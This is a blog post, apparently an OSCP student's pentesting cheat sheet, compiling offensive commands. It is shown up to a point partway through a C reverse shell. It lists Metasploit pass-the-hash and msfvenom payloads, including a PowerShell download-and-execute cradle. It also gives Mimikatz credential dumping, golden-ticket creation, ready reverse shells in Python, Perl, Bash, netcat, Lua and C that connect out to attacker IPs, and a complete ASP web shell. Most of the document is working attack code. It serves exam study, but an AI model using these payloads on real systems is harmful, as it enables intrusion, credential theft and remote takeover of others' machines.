<!DOCTYPE html>
<html lang="en-us">
  <head>
    
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="generator" content="Hugo 0.65.2 with theme Tranquilpeak 0.4.7-BETA">
<meta name="author" content="Sage">
<meta name="keywords" content="security">
<meta name="description" content="
As an OSCP student, I frequently searched the web for notes, tips, advice, or anything that would help me learn the necessary skills to pass the exam. This field guide started off as that, a collection of gathered OSCP notes from around the web, but as I learn more, this post serves as a place to document everything.">


<meta property="og:description" content="
As an OSCP student, I frequently searched the web for notes, tips, advice, or anything that would help me learn the necessary skills to pass the exam. This field guide started off as that, a collection of gathered OSCP notes from around the web, but as I learn more, this post serves as a place to document everything.">
<meta property="og:type" content="article">
<meta property="og:title" content="Pentesting Field Guide">
<meta name="twitter:title" content="Pentesting Field Guide">
<meta property="og:url" content="https://succurity.com/2020/02/pentesting-field-guide/">
<meta property="twitter:url" content="https://succurity.com/2020/02/pentesting-field-guide/">
<meta property="og:site_name" content="Sage&#39;s Succurity Blog">
<meta property="og:description" content="
As an OSCP student, I frequently searched the web for notes, tips, advice, or anything that would help me learn the necessary skills to pass the exam. This field guide started off as that, a collection of gathered OSCP notes from around the web, but as I learn more, this post serves as a place to document everything.">
<meta name="twitter:description" content="
As an OSCP student, I frequently searched the web for notes, tips, advice, or anything that would help me learn the necessary skills to pass the exam. This field guide started off as that, a collection of gathered OSCP notes from around the web, but as I learn more, this post serves as a place to document everything.">
<meta property="og:locale" content="en-us">

  
    <meta property="article:published_time" content="2020-02-22T16:33:58">
  
  
    <meta property="article:modified_time" content="2020-02-22T16:33:58">
  
  
  
    
      <meta property="article:section" content="Offsec">
    
  
  
    
      <meta property="article:tag" content="Offensive Security">
    
      <meta property="article:tag" content="OSCP">
    
      <meta property="article:tag" content="Pentesting">
    
  


<meta name="twitter:card" content="summary">

  <meta name="twitter:site" content="@succurity_">


  <meta name="twitter:creator" content="@succurity_">










  <meta property="og:image" content="https://succurity.com/images/me.jpg">
  <meta property="twitter:image" content="https://succurity.com/images/me.jpg">


    <title>Pentesting Field Guide</title>

    <link rel="icon" href="https://succurity.com/images/favicon.ico">
    

    

    <link rel="canonical" href="https://succurity.com/2020/02/pentesting-field-guide/">

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
    
    
    <link rel="stylesheet" href="https://succurity.com/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
    
    
      
        <link rel="stylesheet"  href="https://succurity.com/css/custom.css">
      
    

    
      
    
    
  </head>

  <body>
    <div id="blog">
      <header id="header" data-behavior="4">
  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
  <div class="header-title">
    <a class="header-title-link" href="https://succurity.com/">Sage&#39;s Succurity Blog</a>
  </div>
  
    
      <a class="header-right-picture "
         href="https://succurity.com/#about">
    
    
    
      
        <img class="header-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
      
    
    </a>
  
</header>

      <nav id="sidebar" data-behavior="4">
  <div class="sidebar-container">
    
      <div class="sidebar-profile">
        <a href="https://succurity.com/#about">
          <img class="sidebar-profile-picture" src="https://succurity.com/images/me.jpg" alt="Author&#39;s picture" />
        </a>
        <h4 class="sidebar-profile-name">Sage</h4>
        
          <h5 class="sidebar-profile-bio">Succurity through Obscurity usually isn&rsquo;t a good idea.</h5>
        
      </div>
    
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://succurity.com/">
    
      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
      
      <span class="sidebar-button-desc">Home</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://succurity.com/categories/write-ups/">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Writeups</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://succurity.com/tags">
    
      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
      
      <span class="sidebar-button-desc">Tags</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://succurity.com/categories">
    
      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
      
      <span class="sidebar-button-desc">Categories</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://succurity.com/page/about">
    
      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
      
      <span class="sidebar-button-desc">About</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      
  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://www.linkedin.com/in/rafasec/" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-linkedin"></i>
      
      <span class="sidebar-button-desc">LinkedIn</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://twitter.com/succurity_" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-twitter"></i>
      
      <span class="sidebar-button-desc">Twitter</span>
    </a>
  </li>

  <li class="sidebar-button">
    
      <a class="sidebar-button-link " href="https://github.com/silverlak3" target="_blank" rel="noopener">
    
      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
      
      <span class="sidebar-button-desc">GitHub</span>
    </a>
  </li>


    </ul>
    <ul class="sidebar-buttons">
      

    </ul>
  </div>
</nav>

      

      <div id="main" data-behavior="4"
        class="
               hasCoverMetaIn
               ">
        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
          
          
            <div class="post-header main-content-wrap text-left">
  
    <h1 class="post-title" itemprop="headline">
      Pentesting Field Guide
    </h1>
  
  
  <div class="postShorten-meta post-meta">
    
      <time itemprop="datePublished" datetime="2020-02-22T16:33:58-08:00">
        
  February 22, 2020

      </time>
    
    
  
  
    <span>in</span>
    
      <a class="category-link" href="https://succurity.com/categories/offsec">Offsec</a>
    
  

  </div>

</div>
          
          <div class="post-content markdown" itemprop="articleBody">
            <div class="main-content-wrap">
              <hr>
<p>As an OSCP student, I frequently searched the web for notes, tips, advice, or anything that would help me learn the necessary skills to pass the exam. This <em>field guide</em> started off as that, a collection of gathered OSCP notes from around the web, but as I learn more, this post serves as a place to document everything.</p>
<p>If this guide helps you in any way, or you think it is useful, or maybe you just think it sucks&hellip; then please, hit me up on twitter and let me know.</p>
<p>Last Updated: 2-22-2020</p>
<h1 id="table-of-contents">Table of Contents</h1><nav id="TableOfContents">
  <ol>
    <li><a href="#metasploit">Metasploit</a>
      <ol>
        <li><a href="#pass-the-hash-w-psexec">Pass-The-Hash w/ PSExec</a></li>
        <li><a href="#msfvenom-reverse-shells">MSFVenom Reverse Shells</a></li>
        <li><a href="#jobs--sessions">Jobs & Sessions</a></li>
        <li><a href="#multi-handler">Multi-Handler</a></li>
        <li><a href="#uploading--downloading-files">Uploading & Downloading Files</a></li>
        <li><a href="#mimikatz">Mimikatz</a></li>
        <li><a href="#golden-ticket">Golden Ticket</a></li>
      </ol>
    </li>
    <li><a href="#shells">Shells</a>
      <ol>
        <li><a href="#python-reverse-shells">Python Reverse Shells</a></li>
        <li><a href="#perl-reverse-shells">Perl Reverse Shells</a></li>
        <li><a href="#bash-reverse-shells">Bash Reverse Shells</a></li>
        <li><a href="#nc-wo--e-flag">NC w/o -e Flag</a></li>
        <li><a href="#cmd-prompt-reverse-shell">CMD Prompt Reverse Shell</a></li>
        <li><a href="#lua-reverse-shell">Lua Reverse Shell</a></li>
        <li><a href="#asp-web-shell">ASP Web Shell</a></li>
        <li><a href="#bind-c-shell">Bind C Shell</a></li>
        <li><a href="#reverse-c-shell">Reverse C Shell</a></li>
      </ol>
    </li>
    <li><a href="#tty-shell-upgrades">TTY Shell Upgrades</a>
      <ol>
        <li><a href="#socat">Socat</a></li>
      </ol>
    </li>
    <li><a href="#nmap">Nmap</a>
      <ol>
        <li><a href="#important-flags">Important Flags</a></li>
        <li><a href="#all-port-scans">All Port Scans</a></li>
        <li><a href="#full-scan">Full Scan</a></li>
        <li><a href="#udp-scan">UDP Scan</a></li>
        <li><a href="#script-scan">Script Scan</a></li>
      </ol>
    </li>
    <li><a href="#web-stuff">Web Stuff</a>
      <ol>
        <li><a href="#gobuster">Gobuster</a></li>
        <li><a href="#extra-web-stuff">Extra Web Stuff</a></li>
        <li><a href="#phpmyadmin-queries">PHPMyAdmin Queries</a></li>
        <li><a href="#sql-injections">SQL Injections</a></li>
        <li><a href="#sqlmap">SQLMap</a></li>
        <li><a href="#wpscan">WPScan</a></li>
        <li><a href="#curl-look-for-putpost">Curl (Look for PUT/POST)</a></li>
        <li><a href="#put-a-php-shell">PUT a PHP Shell</a></li>
        <li><a href="#simple-php-web-shell">Simple PHP Web Shell</a></li>
        <li><a href="#get-a-limited-shell-from-php-webshell">Get a Limited Shell From PHP Webshell:</a></li>
      </ol>
    </li>
    <li><a href="#db-stuff">DB Stuff</a></li>
    <li><a href="#post-exploitation">Post Exploitation</a></li>
    <li><a href="#mimikatz-not-through-metasploit">Mimikatz (Not Through Metasploit)</a></li>
    <li><a href="#windows-file-transfers">Windows File Transfers</a>
      <ol>
        <li><a href="#wget-through-cscript-to-upload-ncevilexe">WGET Through CScript (to upload nc/evil.exe)</a></li>
        <li><a href="#wget-through-powershell-to-upload-ncevilexe">WGET Through PowerShell (to upload nc/evil.exe)</a></li>
        <li><a href="#tftp-windows">TFTP (Windows)</a></li>
        <li><a href="#ftp-transfer">FTP (Transfer)</a></li>
        <li><a href="#smb">SMB</a></li>
      </ol>
    </li>
    <li><a href="#windows-stuff">Windows Stuff</a>
      <ol>
        <li><a href="#check-privs">Check Privs</a></li>
        <li><a href="#resetadd-account">Reset/Add Account</a></li>
      </ol>
    </li>
    <li><a href="#dns-stuff">DNS Stuff</a>
      <ol>
        <li><a href="#dns-zone-transfer">DNS Zone Transfer</a></li>
        <li><a href="#dns-tunneling">DNS Tunneling</a></li>
        <li><a href="#dnsenum">DNSEnum</a></li>
        <li><a href="#dnsrecon">DNSrecon</a></li>
      </ol>
    </li>
    <li><a href="#pivoting">Pivoting</a>
      <ol>
        <li><a href="#rdp-over-ssh-tunnel-static-forwarding">RDP over SSH Tunnel (Static Forwarding):</a></li>
        <li><a href="#ssh-tunnel-dynamic-forwarding">SSH Tunnel (Dynamic Forwarding):</a></li>
      </ol>
    </li>
    <li><a href="#tcpdump">Tcpdump</a>
      <ol>
        <li><a href="#listen-to-icmp-requests">Listen to ICMP Requests</a></li>
      </ol>
    </li>
    <li><a href="#misc">Misc</a>
      <ol>
        <li><a href="#buffalo-nas">Buffalo NAS</a></li>
        <li><a href="#compiling-code">Compiling code</a></li>
        <li><a href="#compile-windows-code-in-linux">Compile Windows Code in Linux</a></li>
      </ol>
    </li>
  </ol>
</nav>
<hr>
<h2 id="metasploit">Metasploit</h2>
<hr>
<h3 id="pass-the-hash-w-psexec">Pass-The-Hash w/ PSExec</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000080"># This is the most common exploit module you&#39;ll be using.</span>
msf &gt; use exploit/windows/smb/psexec
msf exploit<span style="color:#39c">(</span>psexec<span style="color:#39c">)</span> &gt; <span style="color:#cd00cd">set</span> payload windows/meterpreter/reverse_tcp
msf exploit<span style="color:#39c">(</span>psexec<span style="color:#39c">)</span> &gt; <span style="color:#cd00cd">set</span> RHOST 192.168.1.2
msf exploit<span style="color:#39c">(</span>psexec<span style="color:#39c">)</span> &gt; <span style="color:#cd00cd">set</span> SMBUser Administrator
msf exploit<span style="color:#39c">(</span>psexec<span style="color:#39c">)</span> &gt; <span style="color:#cd00cd">set</span> SMBPass e52cac67419a9a224a3bf3fa6cb6d:8846f7eaee8fb106bdd830b7586c
msf exploit<span style="color:#39c">(</span>psexec<span style="color:#39c">)</span> &gt; <span style="color:#cd00cd">set</span> SMBDomain test.local
msf exploit<span style="color:#39c">(</span>psexec<span style="color:#39c">)</span> &gt; exploit
</code></pre></div><h3 id="msfvenom-reverse-shells">MSFVenom Reverse Shells</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000080"># PHP</span>
msfvenom -p php/reverse_php <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 <span style="color:#00cdcd">LPORT</span><span style="color:#39c">=</span><span style="color:#cd00cd">4444</span> -f raw -o dank.php

<span style="color:#000080"># Python</span>
msfvenom -p windows/shell_reverse_tcp <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 <span style="color:#00cdcd">LPORT</span><span style="color:#39c">=</span><span style="color:#cd00cd">443</span>  <span style="color:#00cdcd">EXITFUNC</span><span style="color:#39c">=</span>thread -b <span style="color:#cd0000">&#34;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&#34;</span> -f python -n <span style="color:#cd00cd">32</span>

<span style="color:#000080"># Powershell command</span>
msfvenom -p windows/exec <span style="color:#00cdcd">CMD</span><span style="color:#39c">=</span><span style="color:#cd0000">&#34;powershell \&#34;IEX(New-Object Net.WebClient).downloadString(&#39;http://192.168.1.2/shell.ps1&#39;)\&#34;&#34;</span> -e x86/unicode_mixed -b <span style="color:#cd0000">&#34;\x00\x0d&#34;</span> --platform Windows -a x86

<span style="color:#000080"># C code</span>
msfvenom -p windows/shell_reverse_tcp <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 <span style="color:#00cdcd">LPORT</span><span style="color:#39c">=</span><span style="color:#cd00cd">443</span> <span style="color:#00cdcd">EXITFUNC</span><span style="color:#39c">=</span>thread -f c -e x86/shikata_ga_nai -b <span style="color:#cd0000">&#34;\x00\x0d&#34;</span> &gt; out.txt

<span style="color:#000080"># EXE</span>
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 <span style="color:#00cdcd">LPORT</span><span style="color:#39c">=</span><span style="color:#cd00cd">443</span> -b <span style="color:#cd0000">&#34;\x00&#34;</span> -e x86/shikata_ga_nai -f exe -o shell.exe

<span style="color:#000080"># ASP</span>
msfvenom -p windows/shell_reverse_tcp --format asp <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 -o shell.asp

<span style="color:#000080"># Linux</span>
msfvenom -p linux/x86/shell_reverse_tcp <span style="color:#00cdcd">exitfunc</span><span style="color:#39c">=</span>thread <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 <span style="color:#00cdcd">LPORT</span><span style="color:#39c">=</span><span style="color:#cd00cd">443</span> -f elf
msfvenom -p cmd/unix/reverse_bash <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 <span style="color:#00cdcd">LPORT</span><span style="color:#39c">=</span><span style="color:#cd00cd">4444</span> -f raw &gt; shell.sh

<span style="color:#000080"># Javascript</span>
msfvenom -p java/jsp_shell_reverse_tcp <span style="color:#00cdcd">LHOST</span><span style="color:#39c">=</span>192.168.1.2 <span style="color:#00cdcd">LPORT</span><span style="color:#39c">=</span><span style="color:#cd00cd">4444</span> -f raw &gt; shell.jsp
</code></pre></div><p><strong>Note: Shells with a &ldquo;/&rdquo; are staged and ones with a &ldquo;_&rdquo; are not.<br />
e.g. windows/shell/reverse_tcp vs windows/shell_reverse_tcp</strong></p>
<blockquote>
<p>A staged payload means that your payload consists of two main components: a small stub loader and the final stage payload. When you deliver windows/shell/reverse_tcp to the target machine, for example, you are actually sending the loader first. And then when that loader gets executed, it will ask the handler (on the attacker’s end) to send over the final stage (the larger payload), and finally you get a shell. - <a href="https://blog.rapid7.com/2015/03/25/stageless-meterpreter-payloads/">Metasploit Rapid 7</a></p>
</blockquote>
<h3 id="jobs--sessions">Jobs &amp; Sessions</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000080"># Listing jobs</span>
msf &gt; <span style="color:#cd00cd">jobs</span>

<span style="color:#000080"># Killing a job</span>
msf &gt; <span style="color:#cd00cd">jobs</span> -k &lt;session-number&gt;

<span style="color:#000080"># Killing all jobs</span>
msf &gt; <span style="color:#cd00cd">jobs</span> -K

<span style="color:#000080"># Listing sessions</span>
msf &gt; sessions

<span style="color:#000080"># Upgrading an established session with meterpreter</span>
<span style="color:#000080"># Note: Not all sessions can be upgraded.</span>
msf &gt; sessions -u &lt;session-number&gt;

<span style="color:#000080"># Run a command directly through a sessions</span>
msf &gt; sessions -c &lt;command&gt;

<span style="color:#000080"># Killing a session</span>
msf &gt; sessions -k &lt;session-number&gt;

<span style="color:#000080"># Killing all sessions</span>
msf &gt; sessions -K
</code></pre></div><h3 id="multi-handler">Multi-Handler</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000080"># Starting a multi-handler</span>
msf &gt; use exploit multi/handler
msf &gt; <span style="color:#cd00cd">set</span> payload windows/meterpreter/reverse_tcp
msf &gt; <span style="color:#cd00cd">set</span> lhost 192.168.1.2
msf &gt; <span style="color:#cd00cd">set</span> lport <span style="color:#cd00cd">4444</span>
msf &gt; exploit -j -z
</code></pre></div><h3 id="uploading--downloading-files">Uploading &amp; Downloading Files</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">upload /path/in/your/disk/payload.exe exploit.exe
download /path/in/victim/disk
</code></pre></div><h3 id="mimikatz">Mimikatz</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">load mimikatz
meterpreter &gt; kerberos
meterpreter &gt; ssp
meterpreter &gt; msv
meterpreter &gt; wdigest

- or -
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::searchPasswords

- or -
load kiwi
meterpreter &gt; creds_all
</code></pre></div><h3 id="golden-ticket">Golden Ticket</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000080"># Load Kiwi first</span>
meterpreter &gt; load kiwi

<span style="color:#000080"># Using kiwi to do Golden Ticket</span>
golden_ticket_create -d &lt;domain-name&gt; -k &lt;krbtgt-NTLM&gt; -s &lt;SID-without-RID&gt; -u &lt;User-for-ticket&gt; -t /root/golden.tck

<span style="color:#000080"># Apply Golden Ticket</span>
kerberos_ticket_use /root/golden.tck

<span style="color:#000080"># List active tickets</span>
kerberos_ticket_list
</code></pre></div><hr>
<h2 id="shells">Shells</h2>
<hr>
<h3 id="python-reverse-shells">Python Reverse Shells</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#39c">-</span>c <span style="color:#cd0000">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.1.2&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></div><h3 id="perl-reverse-shells">Perl Reverse Shells</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#39c">-</span>e <span style="color:#cd0000">&#39;use Socket;$i=&#34;192.168.1.2&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>

perl <span style="color:#39c">-</span>e <span style="color:#cd0000">&#39;use Socket;$i=&#34;MY-LOCAL-IP&#34;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>

perl <span style="color:#39c">-</span>MIO <span style="color:#39c">-</span>e <span style="color:#cd0000">&#39;$c=new IO::Socket::INET(PeerAddr,&#34;ATTACKING-IP:80&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>

perl <span style="color:#39c">-</span>e <span style="color:#cd0000">&#39;use Socket;$i=&#34;ATTACKING-IP&#34;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;</span>
</code></pre></div><p>There&rsquo;s also one located in kali: /usr/share/webshells/perl/perl-reverse-shell.pl</p>
<h3 id="bash-reverse-shells">Bash Reverse Shells</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.31/443 0&gt;&amp;<span style="color:#cd00cd">1</span>
</code></pre></div><h3 id="nc-wo--e-flag">NC w/o -e Flag</h3>
<pre><code class="language-bashs" data-lang="bashs">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1| nc 192.168.22.2 443 &gt;/tmp/f
</code></pre><h3 id="cmd-prompt-reverse-shell">CMD Prompt Reverse Shell</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell -Command <span style="color:#cd0000">&#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://192.168.22.66/nc.exe&#39;, &#39;C:\Users\user\Desktop\nc.exe&#39;)&#34;</span>

<span style="color:#000080"># Then run:</span>
C:\Users\jill\Desktop\nc.exe 192.168.22.66 443 -e cmd.exe
</code></pre></div><h3 id="lua-reverse-shell">Lua Reverse Shell</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua">lua <span style="color:#39c">-</span>e <span style="color:#cd0000">&#34;local s=require(&#39;socket&#39;);local t=assert(s.tcp());t:connect(&#39;192.168.22.66&#39;,4445);while true do local r,x=t:receive();local f=assert(io.popen(r,&#39;r&#39;));local b=assert(f:read(&#39;*a&#39;));t:send(b);end;f:close();t:close();&#34;</span>
</code></pre></div><h3 id="asp-web-shell">ASP Web Shell</h3>
<pre><code class="language-asp" data-lang="asp">&lt; %@ Page Language=&quot;VB&quot; Debug=&quot;true&quot; &gt;
&lt; %@ import Namespace=&quot;system.IO&quot; % &gt;
&lt; %@ import Namespace=&quot;System.Diagnostics&quot;&gt;

&lt;script runat=&quot;server&quot;&gt;
Function RunCmd(command)
 Dim res as integer
 Dim myProcess As New Process()
 Dim myProcessStartInfo As New ProcessStartInfo(&quot;c:\windows\system32\cmd.exe&quot;)
 myProcessStartInfo.UseShellExecute = false
 myProcessStartInfo.RedirectStandardOutput = true
 myProcess.StartInfo = myProcessStartInfo
 myProcessStartInfo.Arguments=&quot;/c &quot; + command
 myProcess.Start()
 Dim myStreamReader As StreamReader = myProcess.StandardOutput
 Dim myString As String = myStreamReader.Readtoend()
 myProcess.Close()
 RunCmd= MyString
End Function
&lt;/script&gt;

&lt;html&gt;
&lt;body&gt;
&lt;form action=&quot;cmd.aspx&quot; method=POST&gt;
Enter your shell command &lt;input type=text name=cmd size=4&gt;
&lt;input type=submit name=go&gt;&lt;/form&gt;

&lt; %
if request(&quot;cmd&quot;) &lt;&gt; &quot;&quot; then
response.write(&quot;
&lt;pre&gt;&quot;+ RunCmd(request(&quot;cmd&quot;))+ &quot;&lt;/pre&gt;
&quot;)
end if
%&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre><h3 id="bind-c-shell">Bind C Shell</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#000080">#include</span> <span style="color:#000080">&lt;sys/socket.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;sys/types.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;netinet/in.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;stdlib.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;unistd.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#define LOCAL_PORT 4444
</span><span style="color:#000080"></span>
<span style="color:#00cd00">int</span> main()
{
  <span style="color:#00cd00">int</span> resultfd, sockfd;
  <span style="color:#cdcd00">struct</span> sockaddr_in my_addr;
  <span style="color:#00cd00">char</span> <span style="">\</span><span style="color:#39c">*</span>args[] <span style="color:#39c">=</span> { <span style="color:#cd0000">&#34;/bin/busybox&#34;</span>, <span style="color:#cd0000">&#34;sh&#34;</span>, <span style="color:#cd00cd">NULL</span>};
  sockfd <span style="color:#39c">=</span> socket(AF_INET, SOCK_STREAM, <span style="color:#cd00cd">0</span>);

  <span style="color:#00cd00">int</span> one <span style="color:#39c">=</span> <span style="color:#cd00cd">1</span>;
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, <span style="color:#39c">&amp;</span>one, <span style="color:#cdcd00">sizeof</span>(one));

  my_addr.sin_family <span style="color:#39c">=</span> AF_INET; <span style="color:#000080">// 2
</span><span style="color:#000080"></span>  my_addr.sin_port <span style="color:#39c">=</span> htons(LOCAL_PORT); <span style="color:#000080">// port number
</span><span style="color:#000080"></span>  my_addr.sin_addr.s_addr <span style="color:#39c">=</span> INADDR_ANY; <span style="color:#000080">// 0 fill with the local IP
</span><span style="color:#000080"></span>
  bind(sockfd, (<span style="color:#cdcd00">struct</span> sockaddr <span style="color:#39c">*</span>) <span style="color:#39c">&amp;</span>my_addr, <span style="color:#cdcd00">sizeof</span>(my_addr));
  listen(sockfd, <span style="color:#cd00cd">0</span>);
  resultfd <span style="color:#39c">=</span> accept(sockfd, <span style="color:#cd00cd">NULL</span>, <span style="color:#cd00cd">NULL</span>);
  dup2(resultfd, <span style="color:#cd00cd">2</span>);
  dup2(resultfd, <span style="color:#cd00cd">1</span>);
  dup2(resultfd, <span style="color:#cd00cd">0</span>);
  execve(args[<span style="color:#cd00cd">0</span>], <span style="color:#39c">&amp;</span>args[<span style="color:#cd00cd">0</span>], <span style="color:#cd00cd">0</span>);
  <span style="color:#cdcd00">return</span> <span style="color:#cd00cd">0</span>;
}
</code></pre></div><h3 id="reverse-c-shell">Reverse C Shell</h3>
<div class="highlight"><pre style="color:#ccc;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#000080">#include</span> <span style="color:#000080">&lt;stdio.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;unistd.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;netinet/in.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;sys/types.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;sys/socket.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#include</span> <span style="color:#000080">&lt;arpa/inet.h&gt;</span><span style="color:#000080">
</span><span style="color:#000080">#define REMOTE_ADDR &#34;192.168.1.219&#34;
</span><span style="color:#000080">#define REMOTE_PORT 443
</span><span style="color:#000080"></span>
<span style="color:#00cd00">int</span> main(<span style="color:#00cd00">int</span> argc, <span style="color:#00cd00">char</span> <span style="color:#39c">*</span>argv[])
{
  <span style="color:#cdcd00">struct</span> sockaddr_in sa;
  <span style="color:#00cd00">int</span> s;
  <span style="color:#00cd00">char</span> <span style="">\</span><span style="color:#39c">*</span>args[] <span style="color:#39c">=</span> { <span style="color:#cd0000">&#34;/bin/busybox&#34;</span>, <span style="color:#cd0000">&#34;sh&#34;</span>, <span style="color:#cd00cd">NULL</span>};
